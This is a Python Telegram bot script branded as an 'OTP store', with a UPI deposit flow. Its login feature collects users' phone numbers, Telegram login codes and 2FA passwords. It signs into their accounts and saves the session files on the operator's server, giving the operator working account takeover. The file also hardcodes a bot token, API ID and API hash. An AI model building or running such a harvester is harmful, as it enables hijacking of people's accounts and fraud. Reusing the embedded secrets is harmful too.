import telebot
from telebot import types
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import asyncio
import time

# --- CONFIGURATION (Naya Token Updated) ---
TOKEN = '8692935006:AAFGFN6aeecPubPdd821zq-CmQnZzMtySsw' 
API_ID = 35155488
API_HASH = '9ee6b40363f94481d48dea8a3a871728'
ADMIN_IDS = [7634311488] 

# --- SETTINGS ---
CHANNEL_USERNAME = "PRIME_OTP_STORE" 
UPI_ID = "abhay-op.315@ptyes"
SUPPORT = "@PRIME_OTP_SUPPROT"
ADMIN_USER = "@GOD_ABHAY"

bot = telebot.TeleBot(TOKEN)
user_sessions = {}
db = {'users': {}}

# --- FORCE JOIN CHECK ---
def is_subscribed(user_id):
    try:
        status = bot.get_chat_member(f"@{CHANNEL_USERNAME}", user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return True

@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    if not is_subscribed(uid):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{CHANNEL_USERNAME}"))
        markup.add(types.InlineKeyboardButton("✅ Joined", callback_data="check_join"))
        return bot.send_message(message.chat.id, "❌ Pehle channel join karein tabhi bot chalega!", reply_markup=markup)
    
    if uid not in db['users']: db['users'][uid] = {'balance': 0}
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('📲 Start Login', '💰 Balance', '📥 Deposit', '📞 Support')
    bot.send_message(message.chat.id, f"🔥 Welcome! {ADMIN_USER} OTP Bot is Live.", reply_markup=markup)

# --- DEPOSIT SYSTEM ---
@bot.message_handler(func=lambda message: message.text == '📥 Deposit')
def dep_1(message):
    msg = bot.send_message(message.chat.id, "💰 Amount likho (e.g. 100):")
    bot.register_next_step_handler(msg, dep_2)

def dep_2(message):
    try:
        amt = int(message.text)
        msg = bot.send_message(message.chat.id, f"💳 Pay {amt} to `{UPI_ID}`\n\nAb **UTR Number** bhejo:", parse_mode="Markdown")
        bot.register_next_step_handler(msg, dep_3, amt)
    except: bot.send_message(message.chat.id, "❌ Number likho bhai!")

def dep_3(message, amt):
    utr = message.text
    msg = bot.send_message(message.chat.id, "📸 Payment Screenshot bhejo:")
    bot.register_next_step_handler(msg, dep_final, amt, utr)

def dep_final(message, amt, utr):
    if message.content_type == 'photo':
        for adm in ADMIN_IDS:
            bot.send_message(adm, f"🔔 *NEW DEPOSIT REQUEST*\nUser ID: `{message.from_user.id}`\nAmount: {amt}\nUTR: {utr}")
            bot.forward_message(adm, message.chat.id, message.message_id)
        bot.send_message(message.chat.id, "✅ Admin ko details bhej di gayi hain! 5 min wait karein.")
    else: bot.send_message(message.chat.id, "❌ Photo bhejo bhai!")

# --- LOGIN & 2FA ---
@bot.message_handler(func=lambda message: message.text == '📲 Start Login')
def login_start(message):
    msg = bot.send_message(message.chat.id, "📞 Phone number bhejo (+91 ke saath):")
    bot.register_next_step_handler(msg, process_num)

def process_num(message):
    phone = message.text.replace(" ", "")
    chat_id = message.chat.id
    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH)
    user_sessions[chat_id] = {'client': client, 'phone': phone}
    asyncio.run(send_code(chat_id, phone, client))

async def send_code(chat_id, phone, client):
    await client.connect()
    try:
        req = await client.send_code_request(phone)
        user_sessions[chat_id]['hash'] = req.phone_code_hash
        msg = bot.send_message(chat_id, "📩 OTP bhejo:")
        bot.register_next_step_handler(msg, process_otp)
    except Exception as e: bot.send_message(chat_id, f"❌ Error: {e}")

def process_otp(message):
    otp = message.text.strip()
    chat_id = message.chat.id
    s = user_sessions[chat_id]
    asyncio.run(finish_login(chat_id, otp, s['client'], s['phone'], s['hash']))

async def finish_login(chat_id, otp, client, phone, hash):
    try:
        await client.sign_in(phone, otp, phone_code_hash=hash)
        me = await client.get_me()
        bot.send_message(chat_id, f"✅ Login Success: {me.first_name}\nSession saved!")
    except SessionPasswordNeededError:
        msg = bot.send_message(chat_id, "🔐 2FA Password bhejo:")
        bot.register_next_step_handler(msg, process_2fa)
    except Exception as e: bot.send_message(chat_id, f"❌ Fail: {e}")

def process_2fa(message):
    pw = message.text.strip()
    client = user_sessions[message.chat.id]['client']
    asyncio.run(client.sign_in(password=pw))
    bot.send_message(message.chat.id, "✅ 2FA Success!")

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def check_callback(call):
    if is_subscribed(call.from_user.id):
        bot.answer_callback_query(call.id, "✅ Success!")
        start(call.message)
    else: bot.answer_callback_query(call.id, "❌ Join nahi kiya!", show_alert=True)

# Main Loop
while True:
    try:
        bot.polling(none_stop=True, interval=2)
    except: time.sleep(5)
